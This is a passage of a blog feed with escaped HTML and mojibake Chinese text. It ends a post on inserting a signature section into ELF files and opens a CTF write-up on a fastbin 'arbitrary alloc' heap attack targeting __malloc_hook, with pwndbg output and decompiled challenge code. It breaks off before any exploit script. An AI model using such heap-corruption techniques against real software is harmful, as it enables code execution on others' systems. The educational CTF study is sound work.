    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_addralign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_entsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf32_Shdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è¿™ä¸ªç»“æ„æå­˜å‚¨äº†æ¯ä¸ªsectionçš„è¯¦ç»†ä¿¡æ¯ï¼Œç¬¬ä¸€ä¸ªå­—æ®µ&lt;code class=&quot;highlighter-rouge&quot;&gt;sh_name&lt;/code&gt;æ˜¯section nameåœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;ä¸­çš„åç§»ã€‚&lt;/p&gt;

&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬ç©¶ç«Ÿè¦æ€æ ·æ‰èƒ½æ’å…¥ä¸€ä¸ªsectionå‘¢ï¼Ÿæ­¥éª¤å¤§è‡´å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æƒ³Section Header Tableä¸­æ’å…¥new section Header&lt;/li&gt;
  &lt;li&gt;å‘&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;sectionä¸­æ’å…¥new sectionçš„section name&lt;/li&gt;
  &lt;li&gt;ä¿®æ”¹&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;sh_size&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;ä¿®æ”¹ELF Headerä¸­çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;e_shnum&lt;/code&gt;å­—æ®µ&lt;/li&gt;
  &lt;li&gt;å‘ç›®æ ‡ä½ç½®å†™å…¥sectionå†…å®¹&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬ä¼¼ä¹é‡åˆ°äº†ä¸€äº›å›°æƒ‘ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;sectionåœ¨ELFæ–‡ä»¶çš„ä¸­é—´ï¼Œä¸‡ä¸€ç©ºé—´ä¸å¤Ÿæ·»åŠ section nameäº†å’‹æ•´ã€‚ä¸å¦‚æˆ‘ä»¬ç›´æ¥æ·»åŠ åˆ°æ–‡ä»¶çš„æœ«å°¾å§ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹sh_nameä¸å°±å¯ä»¥äº†å—ã€‚
ä¼¼ä¹æƒ³æ³•ä¸é”™ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬&lt;strong&gt;è¦è®°å¾—ä¿®æ”¹&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;sh_size&lt;/code&gt;&lt;/strong&gt;,å¦åˆ™è¿˜æ²¡æŸ¥åˆ°æ–‡ä»¶æœ«å°¾å°±ç»ˆæ­¢äº†ã€‚&lt;/p&gt;

&lt;p&gt;ä¿®æ”¹åçš„ELFå°¾åº”è¯¥é•¿è¿™æ ·ï¼š&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|------------------------|
|  section Header Table  |-----&amp;gt;è¿™é‡Œå·²ç»æ’å…¥äº†new section header
|------------------------|
|  new  section  name    |
|------------------------|
|  section      contain  |
|------------------------|----&amp;gt; end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ’å…¥new section Headeréš¾ç‚¹åœ¨è®¡ç®—shstrtabçš„åç§»ï¼Œé¦–å…ˆä½ éœ€è¦ç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;filesize - shstrtab.sh_offset&lt;/code&gt;æ¥è·å¾—å­—ç¬¦ä¸²åœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;ä¸­çš„åç§»ï¼Œè‡³äºæ€ä¹ˆè·å¾—&lt;code class=&quot;highlighter-rouge&quot;&gt;shstrtab.sh_offset&lt;/code&gt;â€¦ä½ éœ€è¦å…ˆæ ¹æ®ELF Headerä¸­çš„ç›¸å…³å­—æ®µæ‰¾åˆ°&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;çš„section Headerï¼Œè·å–å¯¹åº”å­—æ®µå°±okäº†ã€‚è¿™é‡Œéœ€è¦æ³¨æ„è¦å°†section headerçš„å…¶ä»–å­—æ®µè®¾ç½®æ­£ç¡®å°±å¯ä»¥äº†ã€‚&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;sh_size&lt;/code&gt;ï¼Œç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;filesize - shstrtab.sh_offset&lt;/code&gt;å°±okäº†ï¼Œç„¶åå»ä¿®æ”¹ELF Headeré‡Œçš„&lt;code class=&quot;highlighter-rouge&quot;&gt;e_shnum&lt;/code&gt;å­—æ®µï¼ŒåŠ 1å³å¯ã€‚æœ€åå‘æ–‡ä»¶å°¾æ’å…¥å¯¹åº”sizeçš„å†…å®¹å°±okäº†ï¼Œæœ€åæˆ‘ä»¬çœ‹ä¸€ä¸‹ç¨‹åºè¿è¡Œçš„demoï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  [25] .bss              NOBITS          0000000000004078 003078 000008 00  WA  0   0  1
  [26] .comment          PROGBITS        0000000000000000 003078 000026 01  MS  0   0  1
  [27] .symtab           SYMTAB          0000000000000000 0030a0 0006d8 18     28  45  8
  [28] .strtab           STRTAB          0000000000000000 003778 0002af 00      0   0  1
  [29] .shstrtab         STRTAB          0000000000000000 003a27 0008cf 00      0   0  1
  [30] .sign             NOTE            00000000000042f8 0042f8 000100 00   A  0   0  1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå¤šåŠ äº†ä¸€ä¸ª&lt;code class=&quot;highlighter-rouge&quot;&gt;.sign&lt;/code&gt;sectionï¼Œå†æ¥çœ‹çœ‹æ–‡ä»¶å°¾ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;000042f0: 2e73 6967 6e00 0000 24e4 639b 5a57 60ec  .sign...$.c.ZW`.
00004300: 1aa4 e313 cb4d 3fb9 9177 0539 2551 a21d  .....M?..w.9%Q..
...
000043f0: be18 7eb1 25af f246                      ..~.%..F
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ç¡®å®ç¬¦åˆsection name + section containçš„ç»“æ„ï¼Œçœ‹æ¥åŸç†æ˜¯æ²¡é—®é¢˜çš„ï¼Œç»æµ‹è¯•å¯ä»¥é€šè¿‡readelfå’Œobjdumpçš„æ£€æµ‹ã€‚æœ€åé™„ä¸Šæºç åœ°å€&lt;a href=&quot;https://github.com/Explainaur/ELFSign&quot;&gt;ELFSign&lt;/a&gt;ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±è¯•ä¸€ä¸‹ã€‚&lt;/p&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="ELF" /><category term="C" /><summary type="html">æœ€è¿‘ä¸€ä¸ªæœˆå­¦äº†ä¸€äº›é›¶æ•£çš„çŸ¥è¯†ï¼Œæœ¬æ¥åœ¨å­¦ä¹ æ“ä½œç³»ç»Ÿç›¸å…³ï¼Œæƒ³å¯¹ç€æ¸…åçš„ucoreè‡ªå·±æ“ä½œä¸€ä¸‹ï¼Œç»“æœbootloaderæ²¡æœ‰è¾¾åˆ°ç†æƒ³çš„æ•ˆæœã€‚ ç„¶åzxyåŒå­¦æ‹‰æˆ‘å»æä¸ªæ¯”èµ›ï¼Œè¦æ±‚å®ç°ä¸€ä¸ªå¯¹ELFç­¾åçš„å·¥å…·ï¼Œæœ€åè¦å†™ä¸€ä¸ªå†…æ ¸æ¨¡å—å»hookç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœç­¾åéªŒè¯é€šè¿‡å°±å¯ä»¥æ‰§è¡Œï¼Œå¦åˆ™ ä¸èƒ½æ‰§è¡Œã€‚æˆ‘çš„æ€è·¯å¤§è‡´æ˜¯è¿™æ ·çš„ï¼š</summary></entry><entry><title type="html">Arbitrary Alloc</title><link href="http://localhost:4000/blog/Arbitrary-alloc" rel="alternate" type="text/html" title="Arbitrary Alloc" /><published>2020-02-18T00:00:00+08:00</published><updated>2020-02-18T00:00:00+08:00</updated><id>http://localhost:4000/blog/Arbitrary-alloc</id><content type="html" xml:base="http://localhost:4000/blog/Arbitrary-alloc">&lt;h3 id=&quot;arbitrary-alloc&quot;&gt;Arbitrary Alloc&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;â€ƒâ€ƒè¿™ç§åˆ©ç”¨æ–¹å¼å°±æ˜¯åœ¨ç›®æ ‡ä½ç½®ä¼ªé€ ä¸€ä¸ªchunkï¼Œç„¶åoverwriteå½“å‰fastbinä¸­chunkçš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘è¯¥chunkï¼Œè¿›è€Œå®ç°ä»»æ„å†™ã€‚è¿™ç§æ¼æ´å¾€å¾€ä¼´éšç€double freeï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ å¾ªç¯é“¾è¡¨æ¥æ§åˆ¶fdæŒ‡é’ˆã€‚å…¶ä¸­ï¼Œæœ€é‡è¦çš„æ­¥éª¤å°±æ˜¯æ„é€ fake_chunkçš„sizeå­—æ®µï¼Œé€šå¸¸æˆ‘ä»¬å¯èƒ½ä¼šè¦†ç›–__malloc_hookï¼Œäºæ˜¯åœ¨å…¶å‘¨å›´ä¼ªé€ fastbinæ—¶å¾€å¾€éœ€è¦é”™ä½æ¥æ»¡è¶³sizeï¼Œè¿™é‡Œå¯ä»¥æ‰‹ç®—ï¼Œæˆ‘æ¯”è¾ƒä¹ æƒ¯ç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;find_fake_fast &amp;lt;addr&amp;gt; size&lt;/code&gt;æ¥å¿«é€ŸæŸ¥æ‰¾åˆé€‚çš„ä½ç½®:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwndbg&amp;gt; print &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;void&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;amp;__malloc_hook   
&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;void &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0x7f67160bab10 &amp;lt;__malloc_hook&amp;gt;
pwndbg&amp;gt; find_fake_fast 0x7f67160bab10 0x7f
FAKE CHUNKS
0x7f67160baaed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  prev_size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 7428137358697955328, 
  size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 127,       &amp;lt;-  size
  fd &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x6715d7be20000000, 
  bk &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x6715d7ba0000007f, 
  fd_nextsize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7f, 
  bk_nextsize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x0
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€é“é¢˜ã€‚&lt;/p&gt;

&lt;h3 id=&quot;search-engine&quot;&gt;&lt;a href=&quot;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine/search&quot;&gt;search-engine&lt;/a&gt;&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;â€ƒâ€ƒè¿™é“é¢˜æ˜¯æˆ‘ç›®å‰åšè¿‡çš„æœ€å¤æ‚çš„é¢˜ç›®ï¼Œå½“ç„¶æ”»å…‹ä¹‹åå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œä¸€é“é¢˜ç›®èƒ½ç‰µæ‰¯åˆ°è¿™ä¹ˆå¤šåˆ©ç”¨ç‚¹ä¹Ÿæ˜¯å¾ˆæ£’äº†ã€‚ä½†æ˜¯åœ¨åˆšå¼€å§‹åˆ†æç®—æ³•çš„æ—¶å€™æˆ‘åŸºæœ¬æ²¡çœ‹æ‡‚å’‹å›äº‹â€¦&lt;/p&gt;

&lt;p&gt;é¦–å…ˆè¿™ä¸ªä¸œè¥¿çš„åŠŸèƒ½å°±æ˜¯å¯ä»¥è¾“å…¥ä¸€ä¸ªå¥å­ï¼Œç„¶åä»–æŠŠå¥å­ç”¨ç©ºæ ¼æ‹†æˆå•è¯ç„¶åå­˜èµ·æ¥ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€æ³¢å…³é”®å‡½æ•°ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;add_sentence()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è¿™ä¸ªå¤§æ¦‚ç®—æ³•å°±æ˜¯è¾“å…¥ä¸€ä¸ªå¥å­ï¼Œç„¶åå­˜èµ·æ¥ï¼Œç„¶åæŠŠè¿™ä¸ªå¥å­ç”¨ç©ºæ ¼åˆ†å‰²æˆå•è¯ï¼Œç„¶åæ¯ä¸ªå•è¯å»ºç«‹ä¸€ä¸ªwordç»“æ„ä½“ï¼Œwordçš„å¤´å­˜åœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;word_head&lt;/code&gt;è¿™ä¸ªä½ç½®ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;......&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the sentence size:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;size1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;throw_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the sentence:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read_by_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_4:&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word_head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;word_head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
